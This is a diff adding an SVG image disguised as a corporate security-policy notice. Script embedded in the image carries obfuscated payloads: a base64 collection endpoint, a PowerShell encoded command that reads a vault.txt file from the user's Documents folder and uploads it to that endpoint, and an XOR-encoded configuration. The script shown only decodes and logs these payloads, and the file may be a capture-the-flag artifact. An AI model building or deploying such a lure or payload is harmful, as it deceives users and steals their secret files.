@@ -1,0 +1,133 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="900"
+    height="500"
+    viewBox="0 0 900 500">
+
+    <rect
+        width="900"
+        height="500"
+        fill="#f5f7fa"/>
+
+    <rect
+        x="80"
+        y="70"
+        width="740"
+        height="360"
+        rx="15"
+        fill="white"
+        stroke="#ccd2d8"/>
+
+    <text
+        x="120"
+        y="145"
+        font-family="Arial"
+        font-size="30"
+        fill="#202124">
+        Corporate Security Notice
+    </text>
+
+    <text
+        x="120"
+        y="205"
+        font-family="Arial"
+        font-size="18"
+        fill="#555">
+        Your workstation security policy has been updated.
+    </text>
+
+    <text
+        x="120"
+        y="245"
+        font-family="Arial"
+        font-size="18"
+        fill="#555">
+        Review the attached security advisory for further information.
+    </text>
+
+    <text
+        x="120"
+        y="335"
+        font-family="Arial"
+        font-size="14"
+        fill="#888">
+        Information Security Department
+    </text>
+
+<script type="text/javascript"><![CDATA[
+
+/*
+ * Security notice helper.
+ * Internal build 4.7.2
+ */
+
+const endpointParts = ["aHR0cHM","6Ly91cGRh","dGVzLm","djdGYubG9jY","WwvYXBp","L2NvbGxlY","3Q="];
+
+const taskParts = ["JABwAGEAdABoA","CAAPQAgA","CIAJABlAG4AdgA6AF","UAUwBFAFIA","UABSAE8ARgBJA","EwARQBcA","EQAbwBjAHUAbQBlAG","4AdABzAFwA","dgBhAHUAbAB0A","C4AdAB4A","HQAIgA7AAoAJABkAG","EAdABhACAA","PQAgAEcAZQB0A","C0AQwBvA","G4AdABlAG4AdAAgAC","QAcABhAHQA","aAAgAC0AUgBhA","HcAOwAKA","EkAbgB2AG8AawBlAC","0AVwBlAGIA","UgBlAHEAdQBlA","HMAdAAgA","C0AVQByAGkAIAAiAG","gAdAB0AHAA","cwA6AC8ALwB1A","HAAZABhA","HQAZQBzAC4AZwBjAH","QAZgAuAGwA","bwBjAGEAbAAvA","GEAcABpA","C8AYwBvAGwAbABlAG","MAdAAiACAA","LQBNAGUAdABoA","G8AZAAgA","FAATwBTAFQAIAAtAE","IAbwBkAHkA","IAAkAGQAYQB0A","GEAOwAKA","A=="];
+
+const profileParts = ["580140424e53424","a444d011901474642470e","4f46575746510","10f0157425144465701","1901454a4d424d4","046010f01404c4f4f4640","574a4c4d7c4e4","6574b4c47011901454a","4f460e514642470","10f01504c565140467c45","4a4f460119015","542564f570d575b5701","0f01474c40564e4","64d577c4a470119016e17","126f7c7771176","0107c146b107c73177a","6f131767010f014","64d47534c4a4d57011901","0c42534a0c404","c4f4f464057015e"];
+
+
+/*
+ * Decode communication endpoint.
+ */
+function resolveEndpoint() {
+    const encoded = endpointParts.join("");
+    return atob(encoded);
+}
+
+
+/*
+ * PowerShell task is stored using the same representation
+ * as PowerShell.exe -EncodedCommand.
+ */
+function resolveTask() {
+    return taskParts.join("");
+}
+
+
+/*
+ * Local configuration protection.
+ */
+function recoverProfile() {
+
+    const raw = profileParts.join("");
+
+    const key = 0x23;
+
+    let output = "";
+
+    for (let i = 0; i < raw.length; i += 2) {
+
+        const value = parseInt(
+            raw.substr(i, 2),
+            16
+        );
+
+        output += String.fromCharCode(
+            value ^ key
+        );
+    }
+
+    return output;
+}
+
+
+const endpoint = resolveEndpoint();
+
+const executionTask = resolveTask();
+
+const profile = recoverProfile();
+
+
+/*
+ * Diagnostic values used by the original loader.
+ */
+console.log(endpoint);
+console.log(executionTask);
+console.log(profile);
+
+]]></script>
+
+</svg>
